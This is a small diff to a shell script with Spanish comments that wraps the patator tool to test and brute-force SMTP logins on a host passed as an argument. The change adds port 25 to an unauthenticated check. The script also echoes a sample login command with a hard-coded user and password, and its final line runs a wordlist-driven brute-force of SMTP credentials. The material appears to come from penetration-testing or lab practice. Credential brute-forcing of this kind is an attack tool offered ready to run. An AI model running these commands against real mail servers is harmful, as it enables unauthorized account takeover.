@@ -2,7 +2,7 @@ echo
 echo "patator smtp_login  host=1.1.1.1 user="antonio" password="Password01"
 echo
 echo "smtp sin autenticacion"
-patator smtp_login host=$1
+patator smtp_login host=$1 port=25
 echo
 echo "Fuerza bruta smtp con patator"
 patator smtp_login  host=$1 inputs='FILE0\nFILE1' 0=usuarios0.txt 1=claves0.txt
